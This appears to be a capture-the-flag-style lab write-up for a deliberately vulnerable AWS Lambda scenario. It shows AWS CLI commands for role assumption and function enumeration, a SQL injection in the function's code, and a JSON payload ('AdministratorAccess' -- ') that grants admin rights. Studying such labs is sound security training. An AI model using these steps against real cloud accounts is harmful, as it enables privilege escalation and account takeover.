----------------

### Vulnerable lambda keynotes

----------------

- We have 2 roles related to lambda `lambda-invoker` and `lambda-policy-applier`-:

<img width="1161" height="744" alt="image" src="https://github.com/user-attachments/assets/88c2bf4e-eed2-41fc-83cd-ac289b745f68" />

- `Lambda-invoker` allows us to invoke lambdas, list lambda and others.

```bash
aws iam get-role-policy --role-name cg-lambda-invoker-cgid8mkn9nudjl --policy-name lambda-invoker --profile bilbo | jq
```
<img width="1277" height="635" alt="image" src="https://github.com/user-attachments/assets/440e1afa-f5fc-4ccc-9f47-2563ccd6722c" />

- Assume the role

```bash
aws sts assume-role --role-arn "arn:aws:iam::xxxxxxxxxxx:role/cg-lambda-invoker-*" --role-session-name lambda-invoker --profile bilbo | jq
```

- Listing lambda functions-:

```bash
aws lambda list-functions --region us-east-1 --profile bilbo_lambda | jq
```

<img width="1543" height="605" alt="image" src="https://github.com/user-attachments/assets/4e465391-5d24-4ca7-8db2-f75d535ec41e" />

- Getting the source code's url-:

```bash
aws lambda get-function --function-name "cgid-policy_applier_lambda1" --query "Code.Location" --region us-east-1 --profile bilbo_lambda | jq
```

- I found sql injection in the `main.py`-:

```python3
target_policys = event['policy_names']
    user_name = event['user_name']
    print(f"target policys are : {target_policys}")

    for policy in target_policys:
        statement_returns_valid_policy = False
        statement = f"select policy_name from policies where policy_name='{policy}' and public='True'"
```

- Exploiting it-:

```sql
AdministratorAccess' -- 
```
- Create a `payload.json`-:

```json
{"user_name":"cg-bilbo-cgid*","policy_names":["AdministratorAccess' -- "]}
```

- Invoking the function-:

```bash
aws lambda invoke --function-name "cgid*-policy_applier_lambda1" --payload file://./payload.json out.txt --region us-east-1 --profile bilbo_lambda | jq
```


- Admin access-:

<img width="1058" height="209" alt="image" src="https://github.com/user-attachments/assets/34ad3b09-3819-48ef-9fac-6750d0c0299d" />

--------------
